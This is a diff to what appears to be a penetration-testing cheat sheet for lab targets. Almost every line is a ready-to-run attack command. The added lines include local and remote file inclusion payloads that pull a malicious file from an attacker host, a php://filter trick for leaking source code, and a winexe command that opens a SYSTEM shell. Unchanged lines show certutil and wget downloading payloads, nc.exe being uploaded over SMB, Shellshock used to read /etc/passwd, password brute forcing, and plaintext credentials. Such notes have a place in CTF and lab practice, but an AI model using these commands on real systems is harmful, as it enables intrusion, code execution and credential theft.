@@ -42,6 +42,7 @@ cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
 sudo smbserver.py -comment 'Transfer' smb smb
 sudo python -m SimpleHTTPServer 80
 certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat
+https://github.com/egre55/ultimate-file-transfer-list
 
 #Priv Esc
 ./LinEnum.sh -s -r report -e /tmp/ -t
@@ -51,19 +52,25 @@ LinPeas.sh
 #FTP 21
 nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.97
 
-#HTTP 80
+#HTTP 80/8080/443
 feroxbuster -u http://10.10.10.97/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
 use raft after.
 nikto -host http://10.10.10.97 -C all -o nikto-scan.html
 nikto -host http://10.10.10.97 -p 80,8080,1234 -C all -o nikto-all.html
 cadaver http://10.10.10.97:8080/webdav/
-/opt/kadimus/kadimus -u http://10.10.10.97/LFIPAGE.php?page=
 //squidcd
 nikto -h 10.10.10.97 -useproxy http://10.10.10.97:4444
-LoginForms - SecLists- Generic-SQLi.txt
-wfuzz -u "http://10.10.10.97/file.php?command=file://FUZZ" -w lfi.list
 wpscan --url http://10.10.10.97/ --enumerate ap,at,tt,cb,dbe,u,m
 git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H 10.10.10.97  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H 10.10.10.97 --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
+
+#LFI/RFI
+LoginForms - SecLists- Generic-SQLi.txt
+wfuzz -u "http://10.10.10.97/file.php?command=file://FUZZ" -w lfi.list
+/opt/kadimus/kadimus -u http://10.10.10.97/LFIPAGE.php?page=
+http://10.10.10.97/index.php?page=php://filter/convert.base64-encode/resource=index
+base64 -d savefile.php
+http://10.10.10.97/page=http://192.168.1.101/maliciousfile.txt%00
+http://10.10.10.97/page=http://192.168.1.101/maliciousfile.txt?
 
 #135 RPC
 rpcinfo -p 10.10.10.97
@@ -76,10 +83,14 @@ cme smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
 cme smb 10.10.10.97 -u users.txt -p passwords.txt --shares --continue-on-success
 medusa -h 10.10.10.97 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
 smbclient -N -L 10.10.10.97
+winexe -U username //10.10.10.97 "cmd.exe" --system
 mount -t cifs '//10.10.10.97/new-site' smb -v -o user=tyler
+umount smb
 smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put nc.exe nc.exe'
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
-umount smb
+
+#161/162 SNMP
+snmp-check -t 10.10.10.97 -c public
 
 #LDAP 389/636/3268/3269
 rpcclient -U '' -N 10.10.10.97
